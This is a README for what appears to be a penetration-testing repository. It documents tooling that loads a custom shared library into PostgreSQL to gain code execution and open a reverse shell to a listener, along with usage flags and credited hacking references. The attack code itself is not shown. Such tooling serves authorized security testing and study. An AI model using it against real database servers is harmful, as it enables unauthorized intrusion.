# psql_UDF

This repo includes 4 files:

  pg_exec.c  (file for creating .so, you should use docker with a compatible version of postgresql)

  psql_so_loader_auto.py (script to load .so lib on the postgresql server if you have rights)

  psql_so_loader_auto_v2.py (the same script but with socket server for reverse shell)

  server_for_pg.py (just alone socket server for reverse shell)




Thanks a lot those people:

  https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions

  https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql

  https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Database-Assessment/postgresql/postgresql_hacking.md

  https://gist.github.com/0xabe-io/916cf3af33d1c0592a90

  https://xakep.ru/2020/04/14/python-reverse-shell/#toc03.1




USAGE:

python psql_so_loader_auto_v2.py [-h] [-p PASSWORD] [-u USERNAME] [-d DATABASE] [-H HOSTNAME] [-P PORT] [-rh RHOST] [-rp RPORT] -f FILENAME

options:
 
    -h, --help            show this help message and exit
 
    -p PASSWORD, --password PASSWORD
                        pass for postgresql
 
    -u USERNAME, --username USERNAME
                        user for postgresql
 
    -d DATABASE, --database DATABASE
                        database for postgresql
 
    -H HOSTNAME, --hostname HOSTNAME
                        hostname or IP for postgresql
 
    -P PORT, --port PORT  database for postgresql
 
    -rh RHOST, --rhost RHOST
                        ip of host listen reverse
 
    -rp RPORT, --rport RPORT
                        port of host listen reverse
 
    -f FILENAME, --filename FILENAME
                        file name of lib.so

